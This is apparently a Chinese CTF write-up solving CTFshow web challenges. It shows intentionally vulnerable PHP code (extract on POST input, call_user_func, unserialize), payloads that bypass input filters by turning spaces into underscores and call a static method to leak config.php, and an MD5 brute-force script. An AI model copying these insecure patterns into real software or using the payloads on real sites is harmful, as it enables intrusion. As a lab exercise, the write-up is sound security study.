---
title: CTFshow 大吉大利 web
categories: 赛题wp
---
## veryphp
<!--more-->

```bash
<?php
error_reporting(0);
highlight_file(__FILE__);
include("config.php");
class qwq
{
    function __wakeup(){
        die("Access Denied!");
    }
    static function oao(){
        show_source("config.php");
    }
}
$str = file_get_contents("php://input");
if(preg_match('/\`|\_|\.|%|\*|\~|\^|\'|\"|\;|\(|\)|\]|g|e|l|i|\//is',$str)){
    die("I am sorry but you have to leave.");
}else{
    extract($_POST);
}
if(isset($shaw_root)){
    if(preg_match('/^\-[a-e][^a-zA-Z0-8]<b>(.*)>{4}\D*?(abc.*?)p(hp)*\@R(s|r).$/', $shaw_root)&& strlen($shaw_root)===29){
        echo $hint;
    }else{
        echo "Almost there."."<br>";
    }
}else{
    echo "<br>"."Input correct parameters"."<br>";
    die();
}
if($ans===$SecretNumber){
    echo "<br>"."Congratulations!"."<br>";
    call_user_func($my_ans);
}

```

分析：
```

qwq类中有静态函数 可通过：：调用(call_user_func特性)
$str 被赋值为 通过 php://input 而 post传的输入
对$str 进行正则 即所有输入不能有 _(重要)

通过 extract将POST的变量导入到当前符号表
对$shaw_root正则且有长度限制 显示hint
如果$ans===$SecretNumber 调用函数 call_user_func

```

思路：
```
  通过post与extract来满足所需要的变量名
  先拿到 hint 再调用静态函数oao
```

解：

对$shaw_root正则：

```bash
if(preg_match('/^\-[a-e][^a-zA-Z0-8]<b>(.*)>{4}\D*?(abc.*?)p(hp)*\@R(s|r).$/', $shaw_root)
```

```
 ^ 就是表示开头，也就是开头 必须是 -
 \- 就是匹配 - 
 [a-e]  就是匹配a到e中任意一个字母
 [^a-zA-Z0-8] 匹配除了这些之外的一个东西。也就是9了
 <b> 就是匹配 <b>
 (.*) 就是匹配任意非换行符  0次或者任意多次
 >{4} 就是匹配>4次 也就是 >>>>
 \D*? 就是 匹配非数字的字符0次或者任意多次，但尽可能少重复
 (abc.*?) 就是匹配abc和任意字符，0次或者任意多次，但尽可能少重复。那就是0次了被，就是匹配abc了
 p 就是匹配p
 (hp)* 就是匹配 hp 0次或者更多次
 \@ 就是 表示匹配 @
 R 就是表示匹配 R
 (s|r). 就是表示 匹配s或者r
 . 就是表示匹配除了换行符以外的所有字符
 $ 就是表示，这是最后。也就是最后不能是换行符就好
```

[在线正则](https://regex101.com)

得：payload：
```
shaw root=-a9<b>11111111>>>>aabcphp@Rs1
（见ctfshow php特性  web123，%20,+,.,[  解析为_）
```

得到hint：

![](https://img-blog.csdnimg.cn/20210305154011813.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
```

md5("shaw".($SecretNumber)."root")==166b47a5cb1ca2431a0edfcef200684f && strlen($SecretNumber)===5

```

求得$SecretNumber 具体值：

```bash
<?php
	for($SecretNumber=10000;$SecretNumber<99999;$SecretNumber++){
		$str="shaw".$SecretNumber."root";
		if(md5($str)=="166b47a5cb1ca2431a0edfcef200684f"){
			echo $SecretNumber;
		}
	}
?>

```
$SecretNumber=21475  

Payload：ans=21475

接下来调用call_user_func
我们可以通过：：调用一个类中的静态方法

![](https://img-blog.csdnimg.cn/2021030515414430.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
Payload：my ans=qwq::oao

okk

![](https://img-blog.csdnimg.cn/20210305154206974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)


---
## 有手就行

查看源码，转图片

![](https://img-blog.csdnimg.cn/20210305154406847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

发现url可疑，改为flag ，查看源码，转图片：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210305154449902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
[微信小程序逆向](https://www.cnblogs.com/yeahwell/p/13546770.html)


---
## spaceman

```bash
<?php 
error_reporting(0); 
highlight_file(__FILE__); 
class spaceman 
{ 
    public $username; 
    public $password; 
    public function __construct($username,$password) 
    { 
        $this->username = $username; 
        $this->password = $password; 
    } 
    public function __wakeup() 
    { 
        if($this->password==='ctfshowvip') 
        { 
            include("flag.php"); 
            echo $flag;     
        } 
        else 
        { 
            echo 'wrong password'; 
        } 
    } 
} 
function filter($string){ 
    return str_replace('ctfshowup','ctfshow',$string); 
} 
$str = file_get_contents("php://input"); 
if(preg_match('/\_|\.|\]|\[/is',$str)){             
    die("I am sorry but you have to leave."); 
}else{ 
    extract($_POST); 
} 
$ser = filter(serialize(new spaceman($user_name,$pass_word))); 
$test = unserialize($ser); 
?> wrong password

```
payload：user name=&pass word=ctfshowvip

空格 变为 `_`


---
## 虎山行(x)
![](https://img-blog.csdnimg.cn/2021030515493081.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)


![](https://img-blog.csdnimg.cn/20210305154936154.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)


![](https://img-blog.csdnimg.cn/20210305154941364.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

